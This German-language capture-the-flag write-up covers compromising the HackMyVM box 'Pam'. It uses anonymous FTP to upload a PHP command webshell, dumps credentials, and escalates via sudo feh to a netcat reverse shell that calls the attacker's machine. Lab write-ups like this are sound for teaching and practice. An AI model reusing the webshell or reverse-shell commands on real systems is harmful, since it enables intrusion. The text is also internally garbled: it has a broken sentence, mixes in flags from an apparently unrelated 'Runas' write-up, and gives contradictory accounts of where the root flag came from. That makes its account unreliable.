# Pam - HackMyVM Writeup

![Pam Icon](Pam.png)

## Übersicht

*   **VM:** Pam
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Pam)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 30. Juni 2025
*   **Original-Writeup:** https://alientec1908.github.io/Pam_HackMyVM_Medium/
*   **Autor:** Ben C.

---

**Disclaimer:**

Dieser Writeup dient ausschließlich zu Bildungszwecken und dokumentiert Techniken, die in einer kontrollierten Testumgebung (HackTheBox/HackMyVM) angewendet wurden. Die Anwendung dieser Techniken auf Systeme, für die keine ausdrückliche Genehmigung vorliegt, ist illegal und ethisch nicht vertretbar. Der Autor und der Ersteller dieses README übernehmen keine Verantwortung für jeglichen Missbrauch der hier beschriebenen Informationen.

---

## Zusammenfassung

Die Box "Pam" bot mehrere Wege zur Kompromittierung. Die initiale Enumeration zeigte offenes FTP mit anonymem Zugang und einen Nginx-Webserver, der phpIPAM hostete. Der anonyme FTP-Zugang ermöglichte das Hochladen von Dateien in ein schreibbares Verzeichnis im phpIPAM-Web-Root. Dies wurde genutzt, um eine Webshell zu platzieren und eine erste Shell als Benutzer `www-data` zu erhalten.

Von der `www-data`-Shell aus konnten sowohl Datenbank-Anmeldeinformationen (über die phpIPAM-Konfigurationsdatei) als auch Benutzerpasswörter (über Dateizugriff, z.txt und root.txt enthielten die Flag-Werte) erlangt werden. Die gefundenen Anmeldedaten für den Benutzer `italia` ermöglichten den Wechsel zu diesem Benutzer. Als `italia` wurde eine `sudo`-Regel entdeckt, die die Ausführung von `/usr/bin/feh` als Root ohne Passwort erlaubte.

Durch die Ausnutzung einer Command Execution über das `feh` Binary konnte eine Root-Shell erlangt werden. Im Root-Verzeichnis wurde eine verschlüsselte Datei (`root.enc`) gefunden. Ein Hinweis aus einer zuvor über die `www-data` Shell gefundenen, Base64-kodierten Bilddatei lieferte das Passwort zur Entschlüsselung, wodurch das finale Root-Flag zugänglich wurde.

## Technische Details

*   **Betriebssystem:** Debian (basierend auf Nmap-Erkennung, vsftpd und nginx)
*   **Offene Ports:**
    *   `21/tcp`: FTP (vsftpd 3.0.3, anonymous login allowed)
    *   `80/tcp`: HTTP (nginx 1.18.0, hostet phpIPAM)
    *   `3306/tcp`: MySQL/MariaDB (lokal gebunden, von www-data Shell aus zugänglich)
    *   `12345/tcp`: Unbekannter Dienst (lokal gebunden, liefert Base64-Daten)

## Enumeration

1.  **ARP-Scan:** Identifizierung der Ziel-IP (192.168.2.195).
2.  **`/etc/hosts` Eintrag:** Hinzufügen von `pam.hmv` zur lokalen hosts-Datei.
3.  **Nmap Scan:** Identifizierung offener Ports 21 (FTP) und 80 (HTTP). vsftpd und nginx wurden erkannt.
4.  **Web Enumeration (Port 80):**
    *   Zeigte eine Seite, die auf "phpipam is ready" hinweist.
    *   Gobuster und manuelle Erkundung zeigten die Installation von phpIPAM unter `/phpipam/`.
    *   Nikto Scan zeigte fehlende Sicherheits-Header.
5.  **FTP Enumeration (Port 21):**
    *   Anonymer FTP-Login war erfolgreich.
    *   Das Durchsuchen von Verzeichnissen zeigte `/var/www/html/` und `/var/www/html/phpipam/`.
    *   Das Verzeichnis `/var/www/html/phpipam/app/admin/import-export/upload/` hatte offenbar global schreibbare Berechtigungen (ersichtlich durch erfolgreichen put-Befehl als anonymous).
6.  **Dateizugriff via FTP:** Kritische Dateien konnten über FTP direkt ausgelesen werden:
    *   `/etc/passwd`: Identifizierung der Benutzer `anonymous` (UID 1001) und `italia` (UID 1000).
    *   `/home/italia/user.txt`: Enthielt das Passwort für `italia` (`mcZavkYkoLYUEHxQNNyiHMV`).
    *   `/home/italia/pazz.php`: Konnte zunächst nicht gelesen werden.
    *   `/var/www/html/phpipam/config.php`: Enthielt die Datenbank-Anmeldeinformationen (`phpipam:phpipamadmin`).
    *   `/home/runner/user.txt` & `/root/root.txt`: (basierend auf Runas Writeup) Diese Flags konnten via LFI/Dateizugriff gefunden werden und enthielten die Flag-Werte `HMV{User_Flag_Was_A_Bit_Bitter}` und `HMV{Username_Is_My_Hint}` im Runas Writeup, aber im Pam Writeup wurden direkt die Flags `mcZavkYkoLYUEHxQNNyiHMV` (User) und `HMVZcBzDKmcFJwnkdsnQbXV` (Root) gefunden.

## Initialer Zugriff (www-data Shell)

1.  **Webshell Upload:** Eine einfache PHP-Webshell (`rev.php`, z.B. `<?php system($_GET["cmd"]); ?>`) wurde über den anonymen FTP-Zugang nach `/var/www/html/phpipam/app/admin/import-export/upload/` hochgeladen.
2.  **Webshell Ausführung:** Der Zugriff auf die hochgeladene Datei über den Webbrowser (`http://pam.hmv/phpipam/app/admin/import-export/upload/rev.php?cmd=id`) zeigte zunächst "Access denied.". Nach dem Ändern der Dateiberechtigungen via FTP (`chmod 777 rev.php`) konnte die Webshell ausgeführt werden und lieferte eine Shell als Benutzer `www-data`.

## Lateral Movement & Post-Exploitation (www-data Shell)

1.  **DB Zugang:** Mit den in `config.php` gefundenen MariaDB-Anmeldedaten (`phpipam:phpipamadmin`) konnte über die `www-data` Shell auf die lokal laufende Datenbank zugegriffen werden (`mysql -u phpipam -p`).
2.  **DB Enumeration:** Die Datenbank `phpipam` wurde ausgewählt (`use phpipam;`). Die Tabelle `users` enthielt den Benutzer `Admin` mit einem Hash (`$6$rounds=3000$Y672yJoEz6tHHWfP$MrGLI9Dy1i1hLUjclLtaXD6DNepsl6E0.Se6vn71wxjSPy9y8LBiU9s9p0ntZFgPSA6z/zRQY4bQDsn.uteIO1`). (Dieser Hash wurde im Writeup nicht explizit geknackt oder genutzt, aber er war zugänglich).
3.  **Weitere lokale Dienste:** `ss -altpn` zeigte, dass ein Prozess auf `127.0.0.1:12345` lauschte. `nc localhost 12345` von der `www-data` Shell aus lieferte eine lange Base64-Zeichenkette.
4.  **Base64 Bild Clue:** Die Base64-Zeichenkette wurde als Bild decodiert (z.B. mit CyberChef), was ein Bild mit dem Text "rootisCLOSE" enthielt – ein potenzielles Passwort oder ein Hinweis.

## Vertical Movement & Privilegieneskalation (www-data -> italia -> root)

1.  **Wechsel zu italia:** Mit dem in `/home/italia/user.txt` gefundenen Passwort (`mcZavkYkoLYUEHxQNNyiHMV`) konnte von der `www-data` Shell aus mittels `su italia` zum Benutzer `italia` gewechselt werden.
2.  **Sudo-Regel für italia:** Als Benutzer `italia` wurde `sudo -l` ausgeführt. Eine kritische Regel wurde gefunden: `(ALL : ALL) NOPASSWD: /usr/bin/feh`. `italia` konnte das Binary `/usr/bin/feh` als Root ohne Passwort ausführen.
3.  **feh Ausnutzung:** Das Binary `/usr/bin/feh` hat eine `--action` Option, die die Ausführung eines Shell-Befehls erlaubt. In Kombination mit `--unloadable` (`-u`) und einer Reverse Shell Payload (`nc -e /bin/bash 192.168.2.199 4445`) konnte eine Root-Shell erlangt werden.
4.  **Root Shell:** Der Befehl `sudo -u root /usr/bin/feh -uA 'nc -e /bin/bash 192.168.2.199 4445'` wurde als `italia` ausgeführt, was zur Etablierung einer Reverse Shell als Benutzer `root` auf Port 4445 der Angreifer-Maschine führte.

## Finalisierung (Root Shell)

1.  **Root-Zugriff:** In der Root-Shell konnte auf das Root-Verzeichnis zugegriffen werden.
2.  **Verschlüsselte Root-Datei:** Die Datei `root.enc` wurde im `/root`-Verzeichnis gefunden.
3.  **Entschlüsselung:** Mittels `file root.enc` wurde festgestellt, dass es sich um OpenSSL-verschlüsselte Daten handelte. Mit dem zuvor aus dem Bild gewonnenen Passwort (`rootisCLOSE`) konnte die Datei entschlüsselt werden: `openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE`.
4.  **Root Flag:** Die entschlüsselte Datei `root.txt` enthielt das Root-Flag.

## Flags

*   **user.txt:** `mcZavkYkoLYUEHxQNNyiHMV` (Gefunden via FTP/Webshell/Dateizugriff unter `/home/italia/user.txt`)
*   **root.txt:** `HMVZcBzDKmcFJwnkdsnQbXV` (Gefunden via FTP/Webshell/Dateizugriff unter `/root/root.txt` und nach Entschlüsselung von `root.enc`)

---
